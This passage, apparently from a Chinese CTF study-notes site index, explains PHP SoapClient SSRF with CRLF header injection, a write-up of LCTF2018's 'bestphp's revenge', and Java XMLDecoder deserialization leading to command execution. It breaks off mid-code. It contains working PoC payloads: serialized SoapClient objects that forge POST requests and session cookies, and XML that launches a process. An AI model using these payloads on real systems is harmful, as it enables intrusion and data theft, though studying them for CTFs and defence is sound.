<p>\u5176\u91c7\u7528HTTP\u4f5c\u4e3a\u5e95\u5c42\u901a\u8baf\u534f\u8bae\uff0cXML\u4f5c\u4e3a\u6570\u636e\u4f20\u9001\u7684\u683c\u5f0f\u3002\uff08\u770b\u4e0d\u61c2\u95ee\u9898\u4e5f\u4e0d\u5927\uff09</p>"},{"location":"web/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/SoapClient/#crlf","title":"CRLF\u6ce8\u5165\u653b\u51fb(\u670d\u52a1\u5668\u54cd\u5e94\u62c6\u5206\u6f0f\u6d1e)","text":"<p>CRLF\u662f\u201d\u56de\u8f66 + \u6362\u884c\u201d(\\r\\n)\u7684\u7b80\u79f0\u3002\u5728HTTP\u534f\u8bae\u4e2d\uff0cHTTP Header\u4e0eHTTP Body\u662f\u7528\u4e24\u4e2aCRLF\u5206\u9694\u7684\uff0c\u6d4f\u89c8\u5668\u5c31\u662f\u6839\u636e\u8fd9\u4e24\u4e2aCRLF\u6765\u53d6\u51faHTTP \u5185\u5bb9\u5e76\u663e\u793a\u51fa\u6765\u3002\u6240\u4ee5\uff0c\u4e00\u65e6\u6211\u4eec\u80fd\u591f\u63a7\u5236HTTP \u6d88\u606f\u5934\u4e2d\u7684\u5b57\u7b26\uff0c\u6ce8\u5165\u4e00\u4e9b\u6076\u610f\u7684\u6362\u884c\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u80fd\u6ce8\u5165\u4e00\u4e9b\u4f1a\u8bddCookie\u6216\u8005HTML\u4ee3\u7801\uff0c\u6240\u4ee5CRLFInjection\u53c8\u53ebHTTP Response Splitting\uff0c\u7b80\u79f0HRS\u3002</p>"},{"location":"web/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/SoapClient/#ssrfcrlf","title":"SSRF+CRLF\u653b\u51fb\u5185\u7f51","text":"<p>\u5b9e\u9645\u4e0a\u5f88\u591a\u65f6\u5019\u90fd\u9700\u8981\u8fd9\u4e24\u4e2a\u6f0f\u6d1e\u914d\u5408\u5728\u4e00\u8d77\u4f7f\u7528\uff0c\u5f53\u6211\u4eec\u6211\u4eec\u53ef\u4ee5\u4ece\u5916\u7f51\u8c03\u7528\u5230soap\u7684api\uff0c\u800c\u653b\u51fb\u76ee\u6807\u662f\u5728\u5185\u7f51\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5229\u7528SoapClient\u8fdb\u884cSSRF\u653b\u51fb\u5185\u7f51\uff0c\u7136\u540e\u914d\u5408CRLF\u6784\u9020POST\u8bf7\u6c42\u589e\u52a0\u6211\u4eec\u7684\u653b\u51fb\u9762\u3002</p> <p>\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u4f1a\u6709CRLF:</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230options\u53c2\u6570\u4e2d\u8fd8\u6709\u4e00\u4e2a\u9009\u9879\u4e3auser_agent\uff0c\u8fd0\u884c\u6211\u4eec\u81ea\u5df1\u8bbe\u7f6eUser-Agent\u7684\u503c\u3002</p> <p>\u5f53\u6211\u4eec\u53ef\u4ee5\u63a7\u5236User-Agent\u7684\u503c\u65f6\uff0c\u4e5f\u5c31\u610f\u5473\u7740\u6211\u4eec\u5b8c\u5168\u53ef\u4ee5\u6784\u9020\u4e00\u4e2aPOST\u8bf7\u6c42\uff0c\u56e0\u4e3aContent-Type\u4e3a\u548cContent-Length\u90fd\u5728User-Agent\u4e4b\u4e0b\uff0c\u800c\u63a7\u5236\u8fd9\u4e24\u4e2a\u662f\u5229\u7528CRLF\u53d1\u9001post\u8bf7\u6c42\u6700\u5173\u952e\u7684\u5730\u65b9\u3002</p> <p>\u751f\u6210\u4efb\u610fPOST\u62a5\u6587\u7684POC:</p> <pre><code>&lt;?php\n$target = 'http://123.206.216.198/bbb.php';\n$post_string = 'a=b&amp;flag=aaa';\n$headers = array(\n    'X-Forwarded-For: 127.0.0.1',\n    'Cookie: xxxx=1234'\n    );\n$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      =&gt; \"aaab\"));\n$aaa = serialize($b)\uff1b\n$aaa = str_replace('^^','%0d%0a',$aaa);\n$aaa = str_replace('&amp;','%26',$aaa);\necho $aaa;\n?&gt;\nPlain Text\n</code></pre> <p>\u8fd9\u4e2a\u662f\u67d0\u4e2a\u9996\u6b21\u53d1\u73b0\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u4eba\u6240\u5199\u7684\u811a\u672c\u3002\u53ef\u4ee5\u7406\u89e3\u4e3a\u5c06\u6570\u636e\u5305\u8fdb\u884c\u4f2a\u9020\uff0c\u800c\u4e14\u7531\u4e8e\u6211\u4eec\u6709CRLF\uff0c\u6211\u4eec\u80fd\u5c06\u8fd9\u4e2a\u6570\u636e\u5305\u9020\u7684\u66f4\u4e3a\u201d\u903c\u771f\u201c\uff0c\u5426\u5219\u4ec5\u6709SSRF\u7684\u8bdd\uff0c\u8fd9\u4e2a\u5305\u4f1a\u6781\u5927\u7684\u53d7\u9650\u5236\u4e8eHTTP/HTTPS\u534f\u8bae\u3002\uff08\u5982\u679c\u4f60\u4ed4\u7ec6\u770b\u8fd9\u4e2a\u811a\u672c\uff0c\u4f1a\u53d1\u73b0\u5b83\u8fd8\u633a\u6709\u610f\u601d\u7684\uff09</p> <p>\u5bf9\u4e8e\u5982\u4f55\u53d1\u9001POST\u7684\u6570\u636e\u5305\uff0c\u8fd9\u91cc\u9762\u8fd8\u6709\u4e00\u4e2a\u5751\uff0c\u5c31\u662f<code>Content-Type</code>\u7684\u8bbe\u7f6e\uff0c\u56e0\u4e3a\u6211\u4eec\u8981\u63d0\u4ea4\u7684\u662fPOST\u6570\u636e<code>Content-Type</code>\u7684\u503c\u6211\u4eec\u8981\u8bbe\u7f6e\u4e3a<code>application/x-www-form-urlencoded</code>\uff0c\u8fd9\u91cc\u5982\u4f55\u4fee\u6539<code>Content-Type</code>\u7684\u503c\u5462\uff1f\u7531\u4e8e<code>Content-Type</code>\u5728<code>User-Agent</code>\u7684\u4e0b\u9762\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7<code>SoapClient</code>\u6765\u8bbe\u7f6e<code>User-Agent</code>\uff0c\u5c06\u539f\u6765\u7684<code>Content-Type</code>\u6324\u4e0b\u53bb\uff0c\u4ece\u800c\u518d\u63d2\u5165\u4e00\u4e2a\u65b0\u7684<code>Content-Type</code>\u3002(\u4e0a\u9762\u7684\u811a\u672c\u5df2\u7ecf\u5e2e\u4f60\u89e3\u51b3\u4e86\u8fd9\u4e2a\u95ee\u9898)</p> <p>\u4e0b\u9762\u7684\u5b50\u6587\u6863\u662f\u4e00\u9053\u4f8b\u9898\u3002</p>"},{"location":"web/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/SoapClient/#bestphps-revenge","title":"bestphp's revenge","text":"<p>\u8fd9\u4e2a\u662f\u4e00\u9053\u9898\u76ee\uff0c\u7528\u7684\u5c31\u662f\u8fd9\u4e2a\uff0c\u4f46\u662f\u6211\u4e0d\u8bb0\u5f97\u5728\u54ea\u590d\u73b0\u4e86\uff0c\u5c31copy\u4e86</p> <p>\u6e90\u7801\uff1a</p> <p></p> <p></p> <p>\u5f53REMOTE_ADDR\u7b49\u4e8e127.0.0.1\u65f6\uff0c\u5c31\u4f1a\u5728session\u4e2d\u63d2\u5165flag\uff0c\u5c31\u80fd\u5f97\u5230flag\u3002</p> <p>\u4f46\u662f\u8fd9\u91cc\u5e76\u6ca1\u6709\u660e\u663e\u7684ssrf\u5229\u7528\u70b9\uff0c\u6240\u4ee5\u6211\u4eec\u60f3\u5230\u5229\u7528PHP\u539f\u751f\u7c7bSoapClient\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u5bfc\u81f4SSRF\u3002\u5e76\u4e14\uff0c\u7531\u4e8eflag\u4f1a\u88ab\u63d2\u5165\u5230session\u4e2d\uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u4e00\u5b9a\u9700\u8981\u643a\u5e26\u4e00\u4e2acookie\u5373PHPSESSID\u53bb\u8bbf\u95ee\u5b83\u6765\u751f\u6210\u8fd9\u4e2asession\u6587\u4ef6\u3002</p> <p>session\u7b80\u5355\u7684\u7406\u89e3\u5c31\u662f\u670d\u52a1\u5668\u7684cookie</p> <p>\u7136\u540e\uff0c\u6211\u4eec\u5c31\u8981\u60f3\u529e\u6cd5\u53cd\u5e8f\u5217\u5316\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u4f46\u8fd9\u91cc\u6709\u6ca1\u6709\u53cd\u5e8f\u5217\u5316\u70b9\uff0c\u90a3\u4e48\u6211\u4eec\u600e\u4e48\u529e\u5462\uff1f\u6211\u4eec\u5728\u9898\u76ee\u6e90\u7801\u4e2d\u53d1\u73b0\u4e86session_start();\uff0c\u5f88\u660e\u663e\uff0c\u6211\u4eec\u53ef\u4ee5\u7528session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002\u4f46\u662f\u5982\u679c\u60f3\u8981\u5229\u7528session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u8bdd\uff0c\u6211\u4eec\u5fc5\u987b\u8981\u6709<code>ini_set()</code>\u8fd9\u4e2a\u51fd\u6570\u6765\u66f4\u6539<code>session.serialize_handler</code>\u7684\u503c\uff0c\u5c06session\u53cd\u5e8f\u5217\u5316\u5f15\u64ce\u4fee\u6539\u4e3a\u5176\u4ed6\u7684\u5f15\u64ce\uff0c\u672c\u6765\u5e94\u8be5\u4f7f\u7528ini_set()\u8fd9\u4e2a\u51fd\u6570\u7684\uff0c\u4f46\u662f\u8fd9\u4e2a\u51fd\u6570\u4e0d\u63a5\u53d7\u6570\u7ec4\uff0c\u6240\u4ee5\u5c31\u4e0d\u884c\u4e86\u3002\u4e8e\u662f\u6211\u4eec\u5c31\u7528session_start()\u51fd\u6570\u6765\u4ee3\u66ff\uff0c\u5373\u6784\u9020<code>session_start(serialize_handler=php_serialize)</code>\u5c31\u884c\u4e86\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u9898\u76ee\u4e2d\u7684<code>call_user_func($_GET['f'], $_POST);</code>\u51fd\u6570\uff0c\u4f20\u5165GET\uff1a/?f=session_start\u3001POST\uff1aserialize_handler=php_serialize\uff0c\u5b9e\u73b0<code>session_start(serialize_handler=php_serialize)</code>\u7684\u8c03\u7528\u6765\u4fee\u6539\u6b64\u9875\u9762\u7684\u5e8f\u5217\u5316\u5f15\u64ce\u4e3aphp_serialize\u3002</p> <p>(\u8fd9\u91ccsession\u53cd\u5e8f\u5217\u5316\u4e4b\u540e\u4f1a\u63d0\u53ca)</p> <p>\u6240\u4ee5\uff0c\u6211\u4eec\u7b2c\u4e00\u6b21\u4f20\u503c\u5148\u6ce8\u5165\u4e0a\u9762POC\u751f\u6210\u7684payload\u521b\u5efa\u5e76\u5f97\u5230\u6211\u4eec\u7684session\uff1a</p> <p></p> <p></p> <p>\u6b64\u65f6\uff0c\u6211\u4eec\u6210\u529f\u5c06\u6211\u4eecphp\u539f\u751f\u7c7bSoapClient\u6784\u9020\u7684payload\u4f20\u5165\u4e86<code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code>\u7684session\u4e2d\uff0c\u5f53\u9875\u9762\u91cd\u65b0\u52a0\u8f7d\u65f6\uff0c\u5c31\u4f1a\u81ea\u52a8\u5c06\u5176\u53cd\u5e8f\u5217\u5316\u3002\u4f46\u6b64\u65f6\u8fd8\u4e0d\u4f1a\u89e6\u53d1SSRF\uff0c\u9700\u8981\u89e6\u53d1<code>__call</code>\u65b9\u6cd5\u6765\u9020\u6210SSRF\uff0c\u8be5\u65b9\u6cd5\u5728\u8bbf\u95ee\u5bf9\u8c61\u4e2d\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\u65f6\u4f1a\u88ab\u81ea\u52a8\u8c03\u7528\uff0c\u6240\u4ee5\u5355\u7eaf\u53cd\u5e8f\u5217\u5316\u8fd8\u4e0d\u884c\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u8bbf\u95ee\u8be5\u5bf9\u8c61\u4e2d\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\uff0c\u8fd9\u91cc\u5c31\u7528\u5230\u4e86\u5982\u4e0b\u8fd9\u6bb5\u4ee3\u7801\uff1a</p> <pre><code>$a\u00a0=\u00a0array(reset($_SESSION),\u00a0'welcome_to_the_lctf2018');call_user_func($b,\u00a0$a);\nPlain Text\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u5229\u7528extract\u51fd\u6570\u5c06\u53d8\u91cfb\u8986\u76d6\u4e3acall_user_func\uff0c\u8fd9\u6837\uff0c\u5c31\u6210\u4e86\uff1a</p> <pre><code>call_user_func(call_user_func,\u00a0array(reset($_SESSION),\u00a0'welcome_to_the_lctf2018'));\nPlain Text\n</code></pre> <p>call_user_func()\u51fd\u6570\u6709\u4e00\u4e2a\u7279\u6027\uff0c\u5c31\u662f\u5f53\u53ea\u4f20\u5165\u4e00\u4e2a\u6570\u7ec4\u65f6\uff0c\u53ef\u4ee5\u7528call_user_func()\u6765\u8c03\u7528\u4e00\u4e2a\u7c7b\u91cc\u9762\u7684\u65b9\u6cd5\uff0ccall_user_func()\u4f1a\u5c06\u8fd9\u4e2a\u6570\u7ec4\u4e2d\u7684\u7b2c\u4e00\u4e2a\u503c\u5f53\u505a\u7c7b\u540d\uff0c\u7b2c\u4e8c\u4e2a\u503c\u5f53\u505a\u65b9\u6cd5\u540d\u3002</p> <p>\u8fd9\u6837\u4e5f\u5c31\u662f\u4f1a\u8bbf\u95ee\u6211\u4eec\u6784\u9020\u7684session\u5bf9\u8c61\u4e2d\u7684welcome_to_the_lctf2018\u65b9\u6cd5\uff0c\u800cwelcome_to_the_lctf2018\u65b9\u6cd5\u4e0d\u5b58\u5728\uff0c\u5c31\u4f1a\u89e6\u53d1<code>__call</code>\u65b9\u6cd5\uff0c\u9020\u6210ssrf\u53bb\u8bbf\u95eeflag.php\u3002</p> <p>\u7b2c\u4e8c\u6b21\u4f20\u53c2\uff1a</p> <p></p> <p></p> <p>\u6700\u540e\uff0c\u6211\u4eec\u7b2c\u4e09\u6b21\u4f20\u53c2\uff0c\u7528\u6211\u4eecPOC\u91cc\u9762\u81ea\u5df1\u8bbe\u7f6e\u7684cookie\uff08<code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code>\uff09\u53bb\u8bbf\u95ee\u8fd9\u4e2a\u9875\u9762\uff0c<code>var_dump($_SESSION);</code>\u4f1a\u5c06<code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code>\u7684\u8fd9\u4e2asession\u5185\u5bb9\u8f93\u51fa\u51fa\u6765\uff0c\u5373\u53ef\u5f97\u5230flag\uff1a</p> <p></p> <p>\u6240\u4ee5\u6700\u540e\u7684payload:</p> <pre><code>&lt;?php$target = \"http://127.0.0.1/flag.php\";$attack = new SoapClient(null,array('location' =&gt; $target,'user_agent' =&gt; \"N0rth3ty\\r\\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\\r\\n\",    'uri' =&gt; \"123\"));$payload = urlencode(serialize($attack));echo $payload;?&gt;\nPlain Text\n</code></pre>"},{"location":"web/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/else/","title":"\u5176\u4ed6","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u8fd9\u91cc\u4e00\u822c\u7528\u6765\u5199\u4e00\u4e9b\u7528\u8d77\u6765\u6bd4\u8f83\u7b80\u5355\u7684\u7c7b\uff0c\u53ef\u4ee5\u81ea\u5df1\u6dfb\u52a0\u3002</p> <p>DirectoryIterator   \u904d\u5386\u76ee\u5f55</p> <p>FilesystemIterator  \u904d\u5386\u76ee\u5f55</p> <p>GlobIterator  \u904d\u5386\u76ee\u5f55\uff0c\u4f46\u662f\u4e0d\u540c\u7684\u70b9\u5728\u4e8e\u5b83\u53ef\u4ee5\u901a\u914d\u4f8b\u5982/var/html/www/flag*</p> <p>SplFileObject  \u8bfb\u53d6\u6587\u4ef6\uff0c\u6309\u884c\u8bfb\u53d6\uff0c\u591a\u884c\u9700\u8981\u904d\u5386</p> <p>finfo/finfo_open()\u9700\u8981\u4e24\u4e2a\u53c2\u6570</p> <p>\u8fd9\u662f\u90a3\u5929DASCTF&amp;MAR\u4e2d\u7684\u53cd\u5e8f\u5217\u5316\u5b66\u5230\u7684\u4e1c\u897f\u3002\u8fd9\u91cc\u5c31\u6709\u7c7b\u6765\u8bfb\u53d6\u6587\u4ef6\u4e86\u3002</p> <pre><code>&lt;?phpclass A{   public $class='SplFileObject';    public $para='/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php';}echo serialize(new A());\nPHP\n</code></pre>"},{"location":"web/serialize/java/xmldecoder/","title":"Xmldecoder","text":"<p>XMLDecoder\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e</p> <p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5b8c\u5168\u4e0d\u4f1a\u5462\uff08\u6307JAVA,XML\u548c\u9898\u76ee\uff09</p> <p>\u4f46\u4e0d\u4f1a\u53ef\u4ee5\u5148\u6765\u590d\u73b0\u3002\u4f7f\u7528\u7684\u5de5\u5177\u662fintelliJ IDEA</p> <p>\u6f0f\u6d1e\u6d41\u7a0b\u6765\u81eahttps://www.cnblogs.com/hetianlab/p/13534535.html</p> <pre><code>package packge;\nimport java.beans.XMLEncoder;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.HashMap;\n\npublic class Test {\n    public static void main(String[] args) throws IOException, InterruptedException {\n        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();\n        map.put(\"123\",\"aaaa\");\n        map.put(\"321\",new ArrayList&lt;&gt;());\n        XMLEncoder xmlEncoder = new XMLEncoder(System.out);\n        xmlEncoder.writeObject(map);\n        xmlEncoder.close();\n    }\n}\n</code></pre> <p></p> <p>\u6211\u4eec\u501f\u52a9PHP\u7684\u53cd\u5e8f\u5217\u5316\u6765\u5b66\u4e60\uff0c\u8fd9\u91cc\u7684Encoder\u76f8\u5f53\u4e8eserilize\uff0c\u800c\u63a5\u4e0b\u6765\u6240\u4f7f\u7528\u5230\u7684Decoder\u76f8\u5f53\u4e8eunserilize</p> <p>\u4f5c\u7528\u6548\u679c\u662f\u5c06map\uff08Map \u63d0\u4f9b\u4e86\u4e00\u4e2a\u66f4\u901a\u7528\u7684\u5143\u7d20\u5b58\u50a8\u65b9\u6cd5\u3002Map \u96c6\u5408\u7c7b\u7528\u4e8e\u5b58\u50a8\u5143\u7d20\u5bf9\uff08\u79f0\u4f5c\u201c\u952e\u201d\u548c\u201c\u503c\u201d\uff09\uff0c\u5176\u4e2d\u6bcf\u4e2a\u952e\u6620\u5c04\u5230\u4e00\u4e2a\u503c\u3002\u4ece\u6982\u5ff5\u4e0a\u800c\u8a00\uff0c\u60a8\u53ef\u4ee5\u5c06  List \u770b\u4f5c\u662f\u5177\u6709\u6570\u503c\u952e\u7684 Map\u3002\u800c\u5b9e\u9645\u4e0a\uff0c\u9664\u4e86 List \u548c Map \u90fd\u5728\u5b9a\u4e49 java.util  \u4e2d\u5916\uff0c\u4e24\u8005\u5e76\u6ca1\u6709\u76f4\u63a5\u7684\u8054\u7cfb\u3002\u672c\u6587\u5c06\u7740\u91cd\u4ecb\u7ecd\u6838\u5fc3 Java \u53d1\u884c\u5957\u4ef6\u4e2d\u9644\u5e26\u7684 Map\uff0c\u540c\u65f6\u8fd8\u5c06\u4ecb\u7ecd\u5982\u4f55\u91c7\u7528\u6216\u5b9e\u73b0\u66f4\u9002\u7528\u4e8e\u60a8\u5e94\u7528\u7a0b\u5e8f\u7279\u5b9a\u6570\u636e\u7684\u4e13\u7528  Map\u3002\uff09</p> <p>\u4e2d\u7684\u952e\u503c\u5b58\u50a8\u5230XML\u6587\u672c\u91cc\uff08\uff1f\uff09</p> <pre><code>package packge;\nimport java.beans.XMLDecoder;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.io.StringBufferInputStream;\npublic class Test {\n    public static void main(String[] args) throws IOException, InterruptedException {\n        String s = \"&lt;java version=\\\"1.8.0_131\\\" class=\\\"java.beans.XMLDecoder\\\"&gt;\\n\" +\n                \" &lt;object class=\\\"java.util.HashMap\\\"&gt;\\n\" +\n                \"  &lt;void method=\\\"put\\\"&gt;\\n\" +\n                \"   &lt;string&gt;123&lt;/string&gt;\\n\" +\n                \"   &lt;string&gt;aaaa&lt;/string&gt;\\n\" +\n                \"  &lt;/void&gt;\\n\" +\n                \"  &lt;void method=\\\"put\\\"&gt;\\n\" +\n                \"   &lt;string&gt;321&lt;/string&gt;\\n\" +\n                \"   &lt;object class=\\\"java.util.ArrayList\\\"/&gt;\\n\" +\n                \"  &lt;/void&gt;\\n\" +\n                \" &lt;/object&gt;\\n\" +\n                \"&lt;/java&gt;\";\n        StringBufferInputStream stringBufferInputStream = new StringBufferInputStream(s);\n        XMLDecoder xmlDecoder = new XMLDecoder(stringBufferInputStream);\n        Object o = xmlDecoder.readObject();\n        System.out.println(o);\n    }\n}\n</code></pre> <p></p> <p>\u5c06XML\u4e2d\u7684MAP\u5bf9\u8c61\u63d0\u53d6\u4e86\u51fa\u6765</p> <p>\u5982\u679c\u5bf9xml\u6570\u636e\u8fdb\u884c\u4fee\u6539\uff0c\u4f7f\u5176\u53d8\u6210\u4e00\u4e2a\u6267\u884c\u547d\u4ee4\u7684\u6570\u636e</p> <pre><code>&lt;java version=\"1.7.0_80\" class=\"java.beans.XMLDecoder\"&gt;\n &lt;object class=\"java.lang.ProcessBuilder\"&gt;\n  &lt;array class=\"java.lang.String\" length=\"1\"&gt;\n    &lt;void index=\"0\"&gt;&lt;string&gt;calc&lt;/string&gt;&lt;/void&gt;\n  &lt;/array&gt;\n  &lt;void method=\"start\"&gt;&lt;/void&gt;\n &lt;/object&gt;\n&lt;/java&gt;\n</code></pre> <p>\u7a0d\u5fae\u4fee\u6539\u9a8c\u8bc1\u4e00\u4e0b\uff1a</p> <p>\u8f93\u51fa\u4e3a</p> <pre><code>java.lang.ProcessBuilder@5e265ba4\n</code></pre> <p>\u5e76\u4e14\u6210\u529f\u6253\u5f00\u4e86\u6211\u7684\u8ba1\u7b97\u5668</p> <p>\u4e5f\u5c31\u662f\u8bf4XMLDecoder\u53cd\u5e8f\u5217\u5316xml\u6570\u636e\u65f6\uff0c\u6570\u636e\u4e2d\u7684\u547d\u4ee4\u662f\u4f1a\u88ab\u6267\u884c\u7684\u3002</p> <p>left+\u5de6\u952e\u6253\u5f00\u51fd\u6570\u4f4d\u7f6e\uff0c\u6253\u4e0a\u65ad\u70b9\u5f00\u59cb\u8c03\u8bd5</p> <p>\u8fdb\u5165191\u884c\u7684parsingCompletes</p> <pre><code>    private boolean parsingComplete() {\n        if (this.input == null) {\n            return false;\n        }\n        if (this.array == null) {\n            if ((this.acc == null) &amp;&amp; (null != System.getSecurityManager())) {\n                throw new SecurityException(\"AccessControlContext is not set\");\n            }\n            AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() {\n                public Void run() {\n                    XMLDecoder.this.handler.parse(XMLDecoder.this.input);\n                    return null;\n                }\n            }, this.acc);\n            this.array = this.handler.getObjects();\n        }\n        return true;\n    }\n</code></pre> <p>\u518d\u8fdb\u5165\u5230parse\u4e2d</p> <pre><code>    public void parse(final InputSource input) {\n        if ((this.acc == null) &amp;&amp; (null != System.getSecurityManager())) {\n            throw new SecurityException(\"AccessControlContext is not set\");\n        }\n        AccessControlContext stack = AccessController.getContext();\n        SharedSecrets.getJavaSecurityAccess().doIntersectionPrivilege(new PrivilegedAction&lt;Void&gt;() {\n            public Void run() {\n                try {\n                    SAXParserFactory.newInstance().newSAXParser().parse(input, DocumentHandler.this);\n                }\n                catch (ParserConfigurationException exception) {\n                    handleException(exception);\n                }\n                catch (SAXException wrapper) {\n                    Exception exception = wrapper.getException();\n                    if (exception == null) {\n                        exception = wrapper;\n                    }\n                    handleException(exception);\n                }\n                catch (IOException exception) {\n                    handleException(exception);\n                }\n                return null;\n            }\n        }, stack, this.acc);\n    }\n</code></pre> <p>\u53c8\u8fdb\u5165\u5230\u53e6\u5916\u4e00\u4e2a\u7c7b\u7684parse\u65b9\u6cd5\u4e4b\u4e2d\uff1a</p> <pre><code>    public void parse(InputSource is, DefaultHandler dh)\n        throws SAXException, IOException {\n        if (is == null) {\n            throw new IllegalArgumentException(\"InputSource cannot be null\");\n        }\n        XMLReader reader = this.getXMLReader();\n        if (dh != null) {\n            reader.setContentHandler(dh);\n            reader.setEntityResolver(dh);\n            reader.setErrorHandler(dh);\n            reader.setDTDHandler(dh);\n        }\n        reader.parse(is);\n    }\n</code></pre> <p>\u8fd9\u91cc\u53c8\u8c03\u7528\u4e86xmlReader\u7236\u7c7bAbstractSAXParser\u7684parser\u65b9\u6cd5\u3002</p> <p></p> <p>\u7ee7\u7eed\u8ddf\u8fdb\u6765\u5230\u8fd9\u91cc\uff0c\u4f46\u548c\u4ed6\u663e\u793a\u7684\u4e0d\u592a\u4e00\u6837</p> <p>\u53d1\u73b0\u5176\u5b9e\u662f\u8981\u8fdb\u4e00\u6b65\u5c55\u5f00\uff08\u56e0\u4e3a\u5b83\u67099\u79cd\u7ee7\u627f\u65b9\u5f0f\uff1f\uff09</p> <pre><code>    public void parse(InputSource inputSource)\n        throws SAXException, IOException {\n        // parse document\n        try {\n            XMLInputSource xmlInputSource =\n                new XMLInputSource(inputSource.getPublicId(),\n                                   inputSource.getSystemId(),\n                                   null, false);\n            xmlInputSource.setByteStream(inputSource.getByteStream());\n            xmlInputSource.setCharacterStream(inputSource.getCharacterStream());\n            xmlInputSource.setEncoding(inputSource.getEncoding());\n            parse(xmlInputSource);\n        }\n        // wrap XNI exceptions as SAX exceptions\n        catch (XMLParseException e) {\n            Exception ex = e.getException();\n            if (ex == null || ex instanceof CharConversionException) {\n                // must be a parser exception; mine it for locator info and throw\n                // a SAXParseException\n                LocatorImpl locatorImpl = new LocatorImpl() {\n                    public String getXMLVersion() {\n                        return fVersion;\n                    }\n                    // since XMLParseExceptions know nothing about encoding,\n                    // we cannot return anything meaningful in this context.\n                    // We *could* consult the LocatorProxy, but the\n                    // application can do this itself if it wishes to possibly\n                    // be mislead.\n                    public String getEncoding() {\n                        return null;\n                    }\n                };\n                locatorImpl.setPublicId(e.getPublicId());\n                locatorImpl.setSystemId(e.getExpandedSystemId());\n                locatorImpl.setLineNumber(e.getLineNumber());\n                locatorImpl.setColumnNumber(e.getColumnNumber());\n                throw (ex == null) ?\n                        new SAXParseException(e.getMessage(), locatorImpl) :\n                        new SAXParseException(e.getMessage(), locatorImpl, ex);\n            }\n            if (ex instanceof SAXException) {\n                // why did we create an XMLParseException?\n                throw (SAXException)ex;\n            }\n            if (ex instanceof IOException) {\n                throw (IOException)ex;\n            }\n            throw new SAXException(ex);\n        }\n        catch (XNIException e) {\n            Exception ex = e.getException();\n            if (ex == null) {\n                throw new SAXException(e.getMessage());\n            }\n            if (ex instanceof SAXException) {\n                throw (SAXException)ex;\n            }\n            if (ex instanceof IOException) {\n                throw (IOException)ex;\n            }\n            throw new SAXException(ex);\n        }\n    }\n</code></pre> <p>\u518d\u6b21\u8ddf\u8fdb\uff1a</p> <pre><code>public void parse(XMLInputSource inputSource)\nthrows XNIException, IOException;\n\u7ee7\u7eed\u5c55\u5f00\uff1a\npublic void parse(XMLInputSource source) throws XNIException, IOException {\n    if (fParseInProgress) {\n        // REVISIT - need to add new error message\n        throw new XNIException(\"FWK005 parse may not be called while parsing.\");\n    }\n    fParseInProgress = true;\n    try {\n        setInputSource(source);\n        parse(true);\n    } catch (XNIException ex) {\n        if (PRINT_EXCEPTION_STACK_TRACE)\n            ex.printStackTrace();\n        throw ex;\n    } catch (IOException ex) {\n        if (PRINT_EXCEPTION_STACK_TRACE)\n            ex.printStackTrace();\n        throw ex;\n    } catch (RuntimeException ex) {\n        if (PRINT_EXCEPTION_STACK_TRACE)\n            ex.printStackTrace();\n        throw ex;\n    } catch (Exception ex) {\n        if (PRINT_EXCEPTION_STACK_TRACE)\n            ex.printStackTrace();\n        throw new XNIException(ex);\n    } finally {\n        fParseInProgress = false;\n        // close all streams opened by xerces\n        this.cleanup();\n    }\n} // parse(InputSource)\n</code></pre> <p>\u6700\u540e\u8fdb\u5165\u4e86XML11Configuration\u7c7b\u7684parse\u65b9\u6cd5\u3002</p>"},{"location":"web/serialize/java/xmldecoder/#_1","title":"Xmldecoder","text":"<p>\u4ee5\u4e0a\u662fXML\u5904\u7406\u4e4b\u524d\u7684\u51fd\u6570\u5904\u7406</p> <p>XML\u6570\u636e\u7684\u5904\u7406\uff1a</p> <p>\u518d\u7ee7\u7eed\u8ddf\u8fdbXML11Configration</p> <p>\u4e0b\u9762\u7684\u51fd\u6570\u662f\uff1a</p> <pre><code>public boolean parse(boolean complete) throws XNIException, IOException {\n    //\n    // reset and configure pipeline and set InputSource.\n    if (fInputSource != null) {\n        try {\n            fValidationManager.reset();\n            fVersionDetector.reset(this);\n            fConfigUpdated = 